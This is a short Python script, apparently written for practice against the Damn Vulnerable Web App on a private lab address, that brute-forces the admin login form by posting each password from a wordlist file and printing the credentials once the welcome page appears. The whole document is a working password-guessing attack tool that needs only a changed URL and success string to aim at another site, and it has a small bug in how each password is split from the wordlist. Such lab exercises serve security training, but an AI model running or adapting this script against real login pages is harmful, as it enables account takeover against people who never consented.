#!/usr/bin/env python
import requests
url = "http://192.168.56.7/dvwa/login.php"
data_dict = {
    'username': "admin",
    'password': "",
    'Login': 'Login'
}
with open("./pass.txt", "r") as pass_file:
    for line_pass_file in pass_file:
        word = line_pass_file.split()
        data_dict['password'] = word
        response = requests.post(url, data=data_dict)
        if 'Welcome to Damn Vulnerable Web App!' in response.content.decode('utf-8'):
            print("[+] username--> " + data_dict['username'])
            print("[+] password--> {}".format(word))
            exit()


print("[+] Reached end of line.")